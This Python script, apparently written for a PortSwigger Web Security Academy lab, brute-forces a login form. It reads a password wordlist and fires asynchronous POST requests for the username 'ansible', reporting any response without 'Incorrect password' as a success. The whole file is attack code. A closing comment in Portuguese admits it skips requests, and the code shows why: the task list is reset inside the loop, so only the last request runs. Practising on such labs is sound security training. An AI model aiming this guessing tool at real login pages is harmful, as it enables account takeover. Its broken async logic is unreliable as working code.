import asyncio
import aiohttp

URL = "https://ac071fd81fb75cd2c0dc4cfb00b00084.web-security-academy.net/login"

pass_file = open('pass_portswigger.txt', 'r')
pass_list = pass_file.readlines()
pass_file.close()
credentials = []

for password in pass_list:
    credentials.append({'username': 'ansible', 'password': password.strip()})


async def fetch(session, url, body_req):
    async with session.post(url, data=body_req) as response:
        html = await response.text()

        if 'Incorrect password' in html:
            print(f"fail: {body_req}")
        else:
            print(f"success: {body_req}")


async def main():
    async with aiohttp.ClientSession() as session:
        for credential in credentials:
            tasks = []
            tasks.append(asyncio.ensure_future(fetch(session, URL, credential)))
        
        await asyncio.gather(*tasks)


asyncio.run(main())

# Obs.: Não está fazendo todos os requests por algum motivo